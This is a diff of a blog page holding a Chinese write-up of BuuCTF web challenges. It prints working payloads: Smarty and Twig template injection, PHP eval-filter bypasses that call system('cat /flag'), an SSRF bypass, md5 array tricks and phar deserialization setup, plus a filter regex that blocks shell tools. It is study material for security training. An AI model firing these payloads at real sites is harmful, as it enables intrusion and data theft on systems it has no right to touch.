@@ -59,7 +59,7 @@
   </style>
   <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
   </style>
-<meta name="generator" content="Hexo 5.1.1"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
   <div class="scrollbar" id="bar">
@@ -317,7 +317,7 @@ You just view *.ctfhub.com </code></pre>
 <p><strong>解题方法</strong></p>
 <p><code>?url=http://127.0.0.123%00.ctfhub.com</code></p>
 <p><strong>收集信息</strong></p>
-<p>善用<a target="_blank" rel="noopener" href="https://bugs.php.net/">php bug</a>搜索漏洞</p>
+<p>善用<a href="https://bugs.php.net/" target="_blank" rel="noopener">php bug</a>搜索漏洞</p>
 <h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p><strong>解题方法</strong></p>
 <p>观察url参数<code>?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>；img进行base64解密后得到<code>MzUzNTM1MmU3MDZlNjc=</code>再次解密得到<code>3535352e706e67</code>，在对此十六进制进行解密得到<code>555.png</code>；img参数存在文件包含漏洞，于是将<code>index.php</code>进行三次加密后的结果<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code>赋值给img</p>
 <p>此时查看源码中图片的值，进行base64解密</p>
@@ -332,26 +332,26 @@ if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;]))
 $file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));
 
 $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
-if (preg_match(&quot;/flag/i&quot;, $file)) &#123;
+if (preg_match(&quot;/flag/i&quot;, $file)) {
     echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;
     die(&quot;xixi～ no flag&quot;);
-&#125; else &#123;
+} else {
     $txt = base64_encode(file_get_contents($file));
     echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;
     echo &quot;&lt;br&gt;&quot;;
-&#125;
+}
 echo $cmd;
 echo &quot;&lt;br&gt;&quot;;
-if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;
+if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) {
     echo(&quot;forbid ~&quot;);
     echo &quot;&lt;br&gt;&quot;;
-&#125; else &#123;
-    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
+} else {
+    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
         echo `$cmd`;
-    &#125; else &#123;
+    } else {
         echo (&quot;md5 is funny ~&quot;);
-    &#125;
-&#125;
+    }
+}
 
 ?&gt;</code></pre>
 <ol>
@@ -385,31 +385,31 @@ $yds = &quot;dog&quot;;
 $is = &quot;cat&quot;;
 $handsome = &#39;yds&#39;;
 
-foreach($_POST as $x =&gt; $y)&#123;
+foreach($_POST as $x =&gt; $y){
     $$x = $y;
-&#125;
+}
 
 ---a
-foreach($_GET as $x =&gt; $y)&#123; // yds =&gt; flag
-    $$x = $$y;  // $yds = $flag = flag&#123;&#125;
-&#125;
+foreach($_GET as $x =&gt; $y){ // yds =&gt; flag
+    $$x = $$y;  // $yds = $flag = flag{}
+}
 ---a
 
-foreach($_GET as $x =&gt; $y)&#123;
-    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;
+foreach($_GET as $x =&gt; $y){
+    if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;){
         exit($handsome);
-    &#125;
-&#125;
+    }
+}
 
 ---b
-if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;
+if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;])){
     exit($yds);
-&#125;
+}
 ---b
 
-if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;
+if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;){
     exit($is);
-&#125;
+}
 
 echo &quot;the flag is: &quot;.$flag;</code></pre>
 <ol>
@@ -434,7 +434,7 @@ echo &quot;the flag is: &quot;.$flag;</code></pre>
 <li>购买前三只独角兽会显示错误操作，因此只能购买第四只</li>
 </ol>
 <p><strong>解题方法</strong></p>
-<p>通过<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">Unicode-Compart</a>查询Unicode字符值大于1337的字符；比如搜索<code>ten thousand</code>，从结果中任选一个字符</p>
+<p>通过<a href="https://www.compart.com/en/unicode" target="_blank" rel="noopener">Unicode-Compart</a>查询Unicode字符值大于1337的字符；比如搜索<code>ten thousand</code>，从结果中任选一个字符</p>
 <p>![截屏2020-08-04 上午9.49.14](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 上午9.49.14.png)</p>
 <p>复制到搜索框即可</p>
 <p>![截屏2020-08-04 上午9.50.35](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 上午9.50.35.png)</p>
@@ -580,17 +580,17 @@ mysql&gt; select b from (select 1,2 as b,3 union select * from user) as c;
         require_once(&#39;./libs/Smarty.class.php&#39;);
         $smarty = new Smarty();
         if (!empty($_SERVER[&#39;HTTP_CLIENT_IP&#39;])) 
-        &#123;
+        {
             $ip=$_SERVER[&#39;HTTP_CLIENT_IP&#39;];
-        &#125;
+        }
         elseif (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))
-        &#123;
+        {
             $ip=$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-        &#125;
+        }
         else
-        &#123;
+        {
             $ip=$_SERVER[&#39;REMOTE_ADDR&#39;];
-        &#125;
+        }
         //$your_ip = $smarty-&gt;display(&quot;string:&quot;.$ip);
         echo &quot;&lt;div class=\&quot;container panel1\&quot;&gt;
                     &lt;div class=\&quot;row\&quot;&gt;
@@ -611,36 +611,36 @@ mysql&gt; select b from (select 1,2 as b,3 union select * from user) as c;
                 &lt;/div&gt;&quot;;
     ?&gt;</code></pre>
 <p>逻辑非常简单，不做过多解释，直接读flag就好</p>
-<pre><code>X-Forwarded-For: &#123;&#123;system('cat /flag')&#125;&#125;</code></pre>
+<pre><code>X-Forwarded-For: {{system('cat /flag')}}</code></pre>
 <h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p><strong>代码审计</strong></p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
 //听说你很喜欢数学，不知道你是否爱它胜过爱flag
-if(!isset($_GET[&#39;c&#39;]))&#123;
+if(!isset($_GET[&#39;c&#39;])){
     show_source(__FILE__);
-&#125;else&#123;
+}else{
     //例子 c=20-1
     $content = $_GET[&#39;c&#39;];
-    if (strlen($content) &gt;= 80) &#123;
+    if (strlen($content) &gt;= 80) {
         die(&quot;太长了不会算&quot;);
-    &#125;
+    }
     $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
-    foreach ($blacklist as $blackitem) &#123;
-        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) &#123;
+    foreach ($blacklist as $blackitem) {
+        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
             die(&quot;请不要输入奇奇怪怪的字符&quot;);
-        &#125;
-    &#125;
+        }
+    }
     //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
     $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
     preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
-    foreach ($used_funcs[0] as $func) &#123;
-        if (!in_array($func, $whitelist)) &#123;
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
             die(&quot;请不要输入奇奇怪怪的函数&quot;);
-        &#125;
-    &#125;
+        }
+    }
     //帮你算出答案
     eval(&#39;echo &#39;.$content.&#39;;&#39;);
-&#125; </code></pre>
+} </code></pre>
 <ol>
 <li>get方法传入参数c</li>
 <li>c的长度不能超过80</li>
@@ -657,43 +657,43 @@ if(!isset($_GET[&#39;c&#39;]))&#123;
 <p><strong>解题方法1</strong></p>
 <p>![截屏2020-08-05 上午10.41.22](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 上午10.41.22.png)</p>
 <p>通过对结果进行逆推来构造payload如下</p>
-<p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$pi)&#123;1&#125;)&amp;0=system&amp;1=cat /flag</code></p>
+<p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$pi){1})&amp;0=system&amp;1=cat /flag</code></p>
 <p>对payload进行解读</p>
 <pre><code class="php">&gt; $pi=base_convert(37907361743,10,36)(dechex(1598506324));    
 &gt; $pi=hex2bin(dechex(1598506324));
 &gt; $pi=_GET;
 
-&gt; ($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag
-&gt; $_GET&#123;pi&#125;($_GET&#123;abs&#125;)
+&gt; ($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag
+&gt; $_GET{pi}($_GET{abs})
 &gt; system(&#39;cat /flag&#39;)</code></pre>
 <ol>
 <li><code>$$</code>为php的可变变量标识，一个普通变量的值作为这个可变变量的变量名</li>
-<li>用于<code>[]</code>被列入黑名单，所以使用<code>&#123;&#125;</code>绕过</li>
+<li>用于<code>[]</code>被列入黑名单，所以使用<code>{}</code>绕过</li>
 <li>注意参数名的选用，因为字符串长度不能超过80</li>
 </ol>
 <p><strong>解题方法2</strong></p>
-<p><code>?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></p>
+<p><code>?c=$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></p>
 <p><code>1: cat /flag</code></p>
 <p>对payload进行解读</p>
-<pre><code class="php">&gt; $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)
-&gt; base_convert(696468,10,36)(base_convert(8768397090111664438,10,30)()&#123;1&#125;)
-&gt; exec(getallheaders()&#123;1&#125;)</code></pre>
+<pre><code class="php">&gt; $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
+&gt; base_convert(696468,10,36)(base_convert(8768397090111664438,10,30)(){1})
+&gt; exec(getallheaders(){1})</code></pre>
 <p>![截屏2020-08-05 上午11.08.57](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 上午11.08.57.png)</p>
 <p><strong>解题方法3</strong></p>
 <p>之前提到函数名实际上就是字符串，因此可以编写脚本令函数名与00 - 99的数字进行异或从而产生其他可以利用的字符串</p>
 <pre><code class="php">&lt;?php
 $payload = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;,  &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39; , &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
-for($k=1;$k&lt;=sizeof($payload);$k++)&#123;
-    for($i = 0;$i &lt; 9; $i++)&#123;
-        for($j = 0;$j &lt;=9;$j++)&#123;
+for($k=1;$k&lt;=sizeof($payload);$k++){
+    for($i = 0;$i &lt; 9; $i++){
+        for($j = 0;$j &lt;=9;$j++){
             $exp = $payload[$k] ^ $i.$j;
             echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;);
             echo &quot;&lt;br /&gt;&quot;;
-        &#125;
-    &#125;
-&#125;</code></pre>
+        }
+    }
+}</code></pre>
 <p>在输出中选用字符串短且可以使用的进行组装后得到payload</p>
-<p><code>?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat /flag</code></p>
+<p><code>?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat /flag</code></p>
 <h2 id="preg-match-all-‘-a-zA-Z-x7f-xff-a-zA-Z-0-9-x7f-xff-‘-content-used-funcs"><a href="#preg-match-all-‘-a-zA-Z-x7f-xff-a-zA-Z-0-9-x7f-xff-‘-content-used-funcs" class="headerlink" title="preg_match_all(‘/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/‘, $content, $used_funcs)"></a>preg_match_all(‘/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/‘, $content, $used_funcs)</h2><h3 id="preg-match-all-执行一个全局正则表达式匹配"><a href="#preg-match-all-执行一个全局正则表达式匹配" class="headerlink" title="preg_match_all -  执行一个全局正则表达式匹配"></a>preg_match_all -  执行一个全局正则表达式匹配</h3><pre><code class="php">preg_match_all(string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]]) : int</code></pre>
 <p>搜索subject中所有匹配pattern给定正则表达式的匹配结果并且将它们以flag指定顺序输出到matches中，**$matches[0]保存完整模式的所有匹配结果**</p>
 <h3 id="a-zA-Z-x7f-xff-a-zA-Z-0-9-x7f-xff"><a href="#a-zA-Z-x7f-xff-a-zA-Z-0-9-x7f-xff" class="headerlink" title="/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/"></a>/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/</h3><p>这句正则表达式的含义实际上就是php变量名的命名规则；一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字或者下划线</p>
@@ -722,50 +722,50 @@ for($k=1;$k&lt;=sizeof($payload);$k++)&#123;
 <p><strong>模板确认</strong></p>
 <p>搬运一个之前被人总结好的一个流程图</p>
 <p>![截屏2020-08-05 下午12.02.29](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 下午12.02.29.png)</p>
-<pre><code>&#123;&#123;7*'7'&#125;&#125; -&gt; 7777777 [Jinja2]
-&#123;&#123;7*'7'&#125;&#125; -&gt; 49      [Twig]</code></pre>
+<pre><code>{{7*'7'}} -&gt; 7777777 [Jinja2]
+{{7*'7'}} -&gt; 49      [Twig]</code></pre>
 <p>测试后回显为<code>Twig</code>，使用<code>Twig</code>对于的payload就可以得到flag</p>
-<pre><code class="php">&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></pre>
+<pre><code class="php">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre>
 <h1 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h1><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p><strong>题目提示</strong></p>
 <pre><code class="php">&lt;?php
 include &#39;flag.php&#39;;
-$flag=&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;
-if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;
+$flag=&#39;MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}&#39;;
+if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) {
     $id=$_GET[&#39;id&#39;];
     $gg=$_GET[&#39;gg&#39;];
-    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; 
+    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) { 
         echo &#39;You got the first step&#39;;
-        if(isset($_POST[&#39;passwd&#39;])) &#123;
+        if(isset($_POST[&#39;passwd&#39;])) {
             $passwd=$_POST[&#39;passwd&#39;];
             if (!is_numeric($passwd)) 
-            &#123;
+            {
                 if($passwd==1234567) 
-                &#123;
+                {
                     echo &#39;Good Job!&#39;;
                     highlight_file(&#39;flag.php&#39;);
                     die(&#39;By Retr_0&#39;);
-                &#125;
+                }
                 else
-                &#123;
+                {
                     echo &quot;can you think twice??&quot;;
-                &#125;
-            &#125;
-            else&#123;
+                }
+            }
+            else{
                 echo &#39;You can not get it !&#39;;
-            &#125;
+            }
 
-        &#125;
-        else&#123;
+        }
+        else{
             die(&#39;only one way to get the flag&#39;);
-        &#125;
-    &#125;
-    else &#123;
+        }
+    }
+    else {
         echo &quot;You are not a real hacker!&quot;;
-    &#125;
-&#125;
-else&#123;
+    }
+}
+else{
     die(&#39;Please input first&#39;);
-&#125;
+}
 ?&gt;</code></pre>
 <p><strong>解题方法</strong></p>
 <p><code>?id[]=1&amp;gg[]=2</code></p>
@@ -800,53 +800,53 @@ nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin</code></pre>
 <p><strong>class.php(简化)</strong></p>
 <pre><code class="php">&lt;?php
 
-class User &#123;
+class User {
     public $db;
 
-    public function __destruct() &#123;
+    public function __destruct() {
         $this-&gt;db-&gt;close();
-    &#125;
-&#125;
+    }
+}
 
-class FileList &#123;
+class FileList {
     private $files;
     private $results;
     private $funcs;
 
-    public function __call($func, $args) &#123;
+    public function __call($func, $args) {
         array_push($this-&gt;funcs, $func);
-        foreach ($this-&gt;files as $file) &#123;
+        foreach ($this-&gt;files as $file) {
             $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
-        &#125;
-    &#125;
+        }
+    }
 
-    public function __destruct() &#123;
+    public function __destruct() {
         ...
         echo $table;
-    &#125;
-&#125;
+    }
+}
 
-class File &#123;
+class File {
     public $filename;
 
-    public function open($filename) &#123;
+    public function open($filename) {
         $this-&gt;filename = $filename;
-        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;
+        if (file_exists($filename) &amp;&amp; !is_dir($filename)) {
             return true;
-        &#125; else &#123;
+        } else {
             return false;
-        &#125;
-    &#125;
+        }
+    }
 
-    public function close() &#123;
+    public function close() {
         return file_get_contents($this-&gt;filename);
-    &#125;
-&#125;
+    }
+}
 ?&gt;</code></pre>
 <p><code>File</code>类中的<code>close()</code>方法存在<code>RCE vulnerability</code></p>
 <p><strong>Q: 如何利用RCE vulnerability?</strong></p>
 <p>代码中并不 <code>unserialize()</code>，但存在文件上传点</p>
-<h2 id="Attack-PHP-Deserialization-Vulnerability-via-Phar"><a href="#Attack-PHP-Deserialization-Vulnerability-via-Phar" class="headerlink" title="Attack PHP Deserialization Vulnerability via Phar"></a><a target="_blank" rel="noopener" href="https://paper.seebug.org/988/">Attack PHP Deserialization Vulnerability via Phar</a></h2><h3 id="the-Phar-File-Structure"><a href="#the-Phar-File-Structure" class="headerlink" title="the Phar File Structure"></a>the Phar File Structure</h3><h4 id="0x00-A-Stub"><a href="#0x00-A-Stub" class="headerlink" title="0x00 A Stub"></a>0x00 A Stub</h4><blockquote>
+<h2 id="Attack-PHP-Deserialization-Vulnerability-via-Phar"><a href="#Attack-PHP-Deserialization-Vulnerability-via-Phar" class="headerlink" title="Attack PHP Deserialization Vulnerability via Phar"></a><a href="https://paper.seebug.org/988/" target="_blank" rel="noopener">Attack PHP Deserialization Vulnerability via Phar</a></h2><h3 id="the-Phar-File-Structure"><a href="#the-Phar-File-Structure" class="headerlink" title="the Phar File Structure"></a>the Phar File Structure</h3><h4 id="0x00-A-Stub"><a href="#0x00-A-Stub" class="headerlink" title="0x00 A Stub"></a>0x00 A Stub</h4><blockquote>
 <p>It can be interpreted as a flag and the format is <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>.The front content is not limited, but it must end with <code>__HALT_COMPILER();?&gt;</code>, otherwise the phar extension will not recognize this file as a phar file.</p>
 </blockquote>
 <h4 id="0x01-A-Manitest-Describing-the-Contents"><a href="#0x01-A-Manitest-Describing-the-Contents" class="headerlink" title="0x01 A Manitest Describing the Contents"></a>0x01 A Manitest Describing the Contents</h4><blockquote>
@@ -862,7 +862,7 @@ class File &#123;
 <p>Construct a phar file according to the file structure, and PHP has a built-in class to handle related operations</p>
 </blockquote>
 <p><strong>Set the <code>phar.readonly</code> option in <code>php.ini</code> to <code>Off</code>, otherwise the phar file cannot be generated.</strong></p>
-<pre><code class="php">class Demo &#123;
+<pre><code class="php">class Demo {
   @unlink(&quot;phar.phar&quot;);
   $phar = new Phar(&quot;phar.phar&quot;); // suffix must be phar
   $phar-&gt;startBuffering();
@@ -872,7 +872,7 @@ class File &#123;
   $phar-&gt;setMetadata($o); // store custom meta-data in manifest
   $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); // compressed file
   $phar-&gt;stopBuffering(); // automatic computation of signature
-&#125;;</code></pre>
+};</code></pre>
 <h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1>
         </div>
         <!-- .entry-content -->
